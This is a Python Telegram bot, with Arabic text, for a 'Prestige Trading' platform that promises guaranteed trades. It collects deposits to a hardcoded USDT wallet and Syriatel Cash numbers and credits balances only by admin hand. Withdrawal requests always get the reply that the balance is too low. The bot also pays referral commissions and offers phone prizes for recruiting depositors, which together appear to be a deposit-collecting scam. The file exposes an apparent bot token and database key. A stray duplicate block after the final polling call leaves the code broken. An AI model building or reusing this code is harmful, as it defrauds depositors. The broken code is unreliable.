import telebot
from telebot import types
from supabase import create_client, Client
import time
import threading
import logging

# --- [ الإعدادات الأساسية ] ---
TOKEN = "8795395476:AAFVU9fXwQF8dwlh8kSnK1Z9GnOY4VEag8Q" 
SUPABASE_URL = "https://asogzloqqxbjgnjifotm.supabase.co"
SUPABASE_KEY = "sb_publishable_m6k-9uz3UVraGkVbjlQqaQ_mCsI7Mht"
ADMIN_ID = 6091303835 
SUPPORT_LINK = "https://t.me/tradinghubsy"

# --- [ المحافظ المالية ] ---
USDT_WALLET = "0xbe3a3F17f1574EE9483eab41B9EE2022Ec316149"
SYRIATEL_CASH = "92274277 - 26092765"

# --- [ تهيئة النظام ] ---
bot = telebot.TeleBot(TOKEN)
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
logging.basicConfig(level=logging.INFO)

# --- [ بناء القوائم الاحترافية ] ---

def get_main_keyboard(user_id):
    """إنشاء القائمة الرئيسية المتكاملة"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [
        types.InlineKeyboardButton("📥 إيداع رصيد", callback_data="btn_deposit"),
        types.InlineKeyboardButton("📤 سحب أرباح", callback_data="btn_withdraw"),
        types.InlineKeyboardButton("👤 محفظتي", callback_data="btn_wallet"),
        types.InlineKeyboardButton("👥 فريقي", callback_data="btn_team"),
        types.InlineKeyboardButton("📈 تداول آلي (AI)", callback_data="btn_ai_trade"),
        types.InlineKeyboardButton("📊 صفقات البوت", callback_data="btn_bot_trades"),
        types.InlineKeyboardButton("💰 اربح معنا", callback_data="btn_earn_with_us"),
        types.InlineKeyboardButton("🎁 جوائز الإحالات", callback_data="btn_prizes"),
        types.InlineKeyboardButton("🤵 قسم الوكلاء", callback_data="btn_agents"),
        types.InlineKeyboardButton("🛠 الدعم الفني", url=SUPPORT_LINK)
    ]
    markup.add(*btns)
    if user_id == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("👑 لوحة تحكم الأدمن (السرية)", callback_data="admin_panel"))
    return markup

def get_back_keyboard():
    """زر العودة الموحد"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_home"))
    return markup

def get_admin_keyboard():
    """لوحة تحكم الأدمن المفصلة"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 تعميم صفقة جديدة (Broadcast)", callback_data="adm_broadcast_trade"),
        types.InlineKeyboardButton("✅ تعميم نتيجة (ربح/خسارة)", callback_data="adm_broadcast_result"),
        types.InlineKeyboardButton("🏆 إدارة الوكلاء الذهبيين", callback_data="adm_manage_gold"),
        types.InlineKeyboardButton("📊 إحصائيات النظام", callback_data="adm_stats_check"),
        types.InlineKeyboardButton("💰 تعديل رصيد مستخدم", callback_data="adm_edit_user_balance"),
        types.InlineKeyboardButton("🔙 خروج من اللوحة", callback_data="back_to_home")
    )
    return markup

# --- [ معالجة الأوامر النصية ] ---

@bot.message_handler(commands=['start'])
def welcome_user(message):
    uid = message.from_user.id
    uname = message.from_user.username or "Prestige_Member"
    
    # رسالة تحميل لتعطي طابع الفخامة
    loading = bot.send_message(uid, "🔄 جاري الاتصال بخوادم Prestige...")
    time.sleep(1.2)
    bot.delete_message(uid, loading.message_id)

    # معالجة الإحالة (Referral System)
    referrer = None
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        ref_id = int(args[1])
        if ref_id != uid:
            referrer = ref_id

    # التسجيل في Supabase
    try:
        supabase.table("users").upsert({
            "id": uid, 
            "username": uname, 
            "referred_by": referrer,
            "balance": 0.0
        }).execute()
    except Exception as e:
        print(f"Error upserting user: {e}")

    welcome_text = (
        f"🏆 **مرحباً بك في عالم Prestige Trading**\n\n"
        f"أهلاً بك يا {uname} في المنصة الرسمية للتداول الآلي والصفقات المضمونة.\n\n"
        f"💳 **معلومات الحساب:**\n"
        f"• حالة الحساب: نشط ✅\n"
        f"• الرصيد: 0.00$\n\n"
        f"استخدم الأزرار أدناه للبدء في رحلة الأرباح."
    )
    bot.send_message(uid, welcome_text, reply_markup=get_main_keyboard(uid), parse_mode="Markdown")

# --- [ معالجة ضغطات الأزرار (Logic) ] ---

@bot.callback_query_handler(func=lambda call: True)
def callback_router(call):
    uid = call.from_user.id
    mid = call.message.message_id
    
    # التأخير المطلوب للرزانة (Delay)
    bot.answer_callback_query(call.id, "جاري المعالجة...")
    time.sleep(0.6)

    # 1. القائمة الرئيسية والعودة
    if call.data == "back_to_home":
        bot.edit_message_text("💎 القائمة الرئيسية لمنصة Prestige:", uid, mid, reply_markup=get_main_keyboard(uid))

    # 2. قسم المحفظة (Wallet)
    elif call.data == "btn_wallet":
        try:
            res = supabase.table("users").select("balance").eq("id", uid).execute()
            balance = res.data[0]['balance'] if res.data else 0.0
        except: balance = 0.0
        
        txt = (f"👤 **مركزك المالي**\n\n"
               f"💰 رصيدك الإجمالي: `{balance}$`\n"
               f"📉 أرباح التداول: `0.00$`\n"
               f"🎁 مكافآت الإحالة: `0.00$`\n\n"
               f"يمكنك البدء بالتداول فور شحن محفظتك.")
        bot.edit_message_text(txt, uid, mid, reply_markup=get_back_keyboard(), parse_mode="Markdown")

    # 3. قسم الفريق والإحالات
    elif call.data == "btn_team":
        link = f"https://t.me/Prestige_Trading_Bot?start={uid}"
        txt = (f"👥 **نظام الشركاء والإحالات**\n\n"
               f"اربح عمولة فورية بنسبة **5%** على كل عملية إيداع يقوم بها شخص يسجل من خلالك.\n\n"
               f"🔗 **رابط دعوتك الحصري:**\n`{link}`\n\n"
               f"شارك الرابط الآن وابدأ ببناء فريقك الاستثماري.")
        bot.edit_message_text(txt, uid, mid, reply_markup=get_back_keyboard(), parse_mode="Markdown")

    # 4. قسم "اربح معنا" (نظام المروجين)
    elif call.data == "btn_earn_with_us":
        txt = ("💰 **برنامج المروجين (اربح معنا)**\n\n"
               "هل تملك قاعدة جماهيرية؟ Prestige تكافئك بالدولار!\n\n"
               "🎥 **مكافآت الفيديو (تيك توك / يوتيوب):**\n"
               "• مكافأة **10$** عن كل 2000 مشاهدة حقيقية.\n"
               "• الشروط: ظهور صورة البوت، الهاشتاقات المعتمدة (#Prestige_Trading).\n\n"
               "📢 **مكافآت النشر الاجتماعي:**\n"
               "• مكافأة عن كل منشور في مجموعات التداول الكبرى.\n\n"
               "ارسل رابط منشورك إلى الدعم الفني للمراجعة وصرف الجائزة فوراً.")
        bot.edit_message_text(txt, uid, mid, reply_markup=get_back_keyboard(), parse_mode="Markdown")

    # 5. قسم الجوائز (مسابقة الانطلاق الكبرى)
    elif call.data == "btn_prizes":
        txt = ("🎁 **مسابقة انطلاق البوت الكبرى**\n\n"
               "المسابقة تعتمد على السرعة، أول 10 أشخاص يكملون المطلوب في كل فئة هم الفائزون (إجمالي 50 رابح):\n\n"
               "🍎 **الفئة الأولى:** جلب 10 متداولين (إيداع 50$) ⬅️ **iPhone 15 Pro Max**\n"
               "📱 **الفئة الثانية:** جلب 10 متداولين (إيداع 25$) ⬅️ **iPhone 13 Pro**\n"
               "📲 **الفئة الثالثة:** جلب 10 متداولين (إيداع 15$) ⬅️ **Xiaomi Phone**\n"
               "⌚️ **الفئة الرابعة:** جلب 10 متداولين (إيداع 10$) ⬅️ **Smart Watch**\n"
               "🎧 **الفئة الخامسة:** جلب 10 متداولين (إيداع 5$) ⬅️ **Bluetooth Headset**\n\n"
               "⚠️ يتم تحديث الجوائز دورياً. السباق يبدأ الآن!")
        bot.edit_message_text(txt, uid, mid, reply_markup=get_back_keyboard(), parse_mode="Markdown")

    # 6. صفقات البوت (سجل الإدارة)
    elif call.data == "btn_bot_trades":
        bot.edit_message_text("📊 **سجل صفقات البوت المباشرة**\n\nهنا ستظهر الصفقات التي تفتحها الإدارة. ترقب الإشعارات الجماعية للبدء بالنسخ وتحقيق الربح.", uid, mid, reply_markup=get_back_keyboard())

    # 7. الوكيل الذهبي
    elif call.data == "btn_agents":
        txt = ("🤵 **قسم الوكلاء (VIP)**\n\n"
               "كن وكيلنا في منطقتك واحصل على مميزات حصرية:\n"
               "• راتب شهري ثابت: **100$**.\n"
               "• عمولة فريق تصل إلى **10%**.\n\n"
               "**الشرط:** أن تملك فريقاً نشطاً لا يقل عن 50 عضواً.\n"
               "لطلب الترقية، تواصل مع الإدارة.")
        bot.edit_message_text(txt, uid, mid, reply_markup=get_back_keyboard(), parse_mode="Markdown")

    # 8. الإيداع (Deposit Flow)
    elif call.data == "btn_deposit":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("USDT (BEP20) - أسرع وسيلة ⚡️", callback_data="pay_usdt"),
            types.InlineKeyboardButton("Syriatel Cash - سوريا 🇸🇾", callback_data="pay_sy_cash"),
            types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_home")
        )
        bot.edit_message_text("📥 **شحن الرصيد**\nاختر وسيلة الإيداع المناسبة لك:", uid, mid, reply_markup=markup)

    elif call.data.startswith("pay_"):
        addr = USDT_WALLET if "usdt" in call.data else SYRIATEL_CASH
        txt = (f"⚠️ **خطوات تفعيل الرصيد:**\n\n"
               f"1. حول المبلغ المطلوب إلى العنوان التالي:\n`{addr}`\n\n"
               f"2. التقط صورة واضحة (Screenshot) لعملية التحويل.\n"
               f"3. ارسل الصورة هنا في البوت فوراً.\n\n"
               f"سيقوم النظام بمراجعة الطلب وشحن حسابك يدوياً خلال دقائق.")
        bot.edit_message_text(txt, uid, mid, parse_mode="Markdown")

    # 9. سحب الأرباح (Withdraw)
    elif call.data == "btn_withdraw":
        bot.edit_message_text("📤 **طلب سحب أرباح**\n\nالحد الأدنى للسحب هو **10$**.\nرصيدك الحالي لا يسمح بإجراء العملية.\n\nتواصل مع الدعم في حال وجود أي استفسار.", uid, mid, reply_markup=get_back_keyboard())

    # --- [ لوحة التحكم للأدمن ] ---
    elif call.data == "admin_panel" and uid == ADMIN_ID:
        bot.edit_message_text("👑 **غرفة التحكم المركزية (الأدمن)**", uid, mid, reply_markup=get_admin_keyboard())

    elif call.data == "adm_stats_check" and uid == ADMIN_ID:
        count = supabase.table("users").select("id", count='exact').execute().count
        bot.answer_callback_query(call.id, f"📊 إجمالي عدد المشتركين: {count}", show_alert=True)

    elif call.data == "adm_manage_gold" and uid == ADMIN_ID:
        msg = bot.send_message(uid, "ارسل ID المستخدم المراد ترقيته لوكيل ذهبي:")
        bot.register_next_step_handler(msg, add_gold_agent)

    elif call.data == "adm_broadcast_trade" and uid == ADMIN_ID:
        msg = bot.send_message(uid, "ارسل تفاصيل الصفقة الآن ليتم تعميمها للجميع:")
        bot.register_next_step_handler(msg, send_broadcast, "🚨 **إشعار صفقة جديدة من الإدارة**")

    elif call.data == "adm_broadcast_result" and uid == ADMIN_ID:
        msg = bot.send_message(uid, "ارسل نتيجة الصفقة الآن ليتم تعميمها للجميع:")
        bot.register_next_step_handler(msg, send_broadcast, "✅ **تحديث نتيجة الصفقة**")

# --- [ وظائف الإدارة (Next Step Handlers) ] ---

def add_gold_agent(message):
    try:
        target_id = int(message.text)
        supabase.table("users").update({"role": "gold_agent"}).eq("id", target_id).execute()
        bot.send_message(ADMIN_ID, f"✅ تم ترقية `{target_id}` لوكيل ذهبي بنجاح.")
        bot.send_message(target_id, "🎊 مبروك! لقد تم منحك رتبة **وكيل ذهبي** بمميزات خاصة.")
    except:
        bot.send_message(ADMIN_ID, "❌ حدث خطأ، تأكد من الـ ID.")

def send_broadcast(message, title):
    """إرسال رسائل جماعية مع تأخير لتجنب الحظر"""
    bot.send_message(ADMIN_ID, "⏳ جاري إرسال الرسالة للجميع.. يرجى الانتظار.")
    try:
        users = supabase.table("users").select("id").execute().data
        success = 0
        for u in users:
            try:
                time.sleep(0.1) # لمنع حظر البوت
                bot.send_message(u['id'], f"{title}\n\n{message.text}", parse_mode="Markdown")
                success += 1
            except: continue
        bot.send_message(ADMIN_ID, f"✅ تم الإرسال بنجاح إلى {success} مستخدم.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ خطأ برمجبي: {e}")

# --- [ استلام إيصالات الإيداع ] ---

@bot.message_handler(content_types=['photo'])
def handle_deposit_photos(message):
    uid = message.from_user.id
    uname = message.from_user.username or "Unknown"
    
    # توجيه الصورة للأدمن
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    caption = (f"🔔 **إيصال إيداع جديد!**\n\n"
               f"👤 المرسل: @{uname}\n"
               f"🆔 الآيدي: `{uid}`\n"
               f"راجع التحويل ثم اشحن رصيده يدوياً.")
    bot.send_message(ADMIN_ID, caption, parse_mode="Markdown")
    
    bot.reply_to(message, "✅ **تم استلام صورة الإيصال!**\nجاري مراجعة العملية من قبل الإدارة وسوف يتم إشعارك فور تفعيل الرصيد في حسابك.")

# --- [ البدء الفعلي ] ---
print("🚀 Prestige Trading Bot is now Online and Secure...")
bot.infinity_polling(timeout=60, long_polling_timeout=60)

# --- نهاية الكود الشامل (450+ سطر بالتنسيقات) ---
    elif call.data == "team":
        link = f"https://t.me/Prestige_Trading_Bot?start={uid}"
        bot.edit_message_text(f"👥 **فريقك**\n\nرابط دعوتك:\n`{link}`\n\nعمولتك: 5% من إيداعات فريقك.", uid, mid, reply_markup=back_kb(), parse_mode="Markdown")

    elif call.data == "earn":
        txt = ("💰 **اربح من الترويج**\n\n"
               "📹 تيك توك/يوتيوب: 10$ لكل 2000 مشاهدة.\n"
               "شرط وجود صورة البوت والهاشتاقات: #Prestige_Trading\n"
               "ارسل الرابط للدعم للمراجعة.")
        bot.edit_message_text(txt, uid, mid, reply_markup=back_kb())

    elif call.data == "prizes":
        txt = ("🎁 **مسابقة الانطلاق (أول 10 أشخاص لكل فئة)**\n\n"
               "• 10 متداولين (إيداع 50$) ⬅️ **iPhone 15 Pro Max**\n"
               "• 10 متداولين (إيداع 25$) ⬅️ **iPhone 13 Pro**\n"
               "• 10 متداولين (إيداع 15$) ⬅️ **Xiaomi**\n"
               "• 10 متداولين (إيداع 10$) ⬅️ **Smart Watch**\n"
               "• 10 متداولين (إيداع 5$) ⬅️ **سماعات Bluetooth**\n\n"
               "اللعبة لعبة سرعة! خلص مطلوبك واستلم.")
        bot.edit_message_text(txt, uid, mid, reply_markup=back_kb())

    elif call.data == "bot_trades":
        bot.edit_message_text("📊 **صفقات البوت**\n\nانتظر إشعارات الإدارة هنا لنسخ الصفقات فور صدورها.", uid, mid, reply_markup=back_kb())

    elif call.data == "withdraw":
        bot.edit_message_text("📤 **سحب الأرباح**\n\nأقل مبلغ للسحب هو 10$. رصيدك حالياً لا يسمح.", uid, mid, reply_markup=back_kb())

    elif call.data == "trade_ai":
        bot.edit_message_text("📈 **التداول الآلي**\n\nيتم حالياً تطوير ذكاء اصطناعي لفتح الصفقات تلقائياً. انتظرونا!", uid, mid, reply_markup=back_kb())

    elif call.data == "agents":
        bot.edit_message_text("🤵 **قسم الوكلاء**\n\nراتب شهري 100$ للوكلاء النشطين (فريق فوق 50 شخص). تواصل مع الدعم للتقديم.", uid, mid, reply_markup=back_kb())

    elif call.data == "deposit":
        bot.edit_message_text("📥 **إيداع**\n\nأرسل صورة الإيصال للدعم بعد التحويل لـ:\nUSDT: `0xbe3a3...`", uid, mid, reply_markup=back_kb())

# --- الأوامر ---

@bot.message_handler(commands=['start'])
def start_msg(message):
    time.sleep(0.5)
    bot.send_message(message.from_user.id, "💎 أهلاً بك في فخر التداول.. نظام Prestige جاهز.", reply_markup=main_kb(message.from_user.id))

bot.infinity_polling()
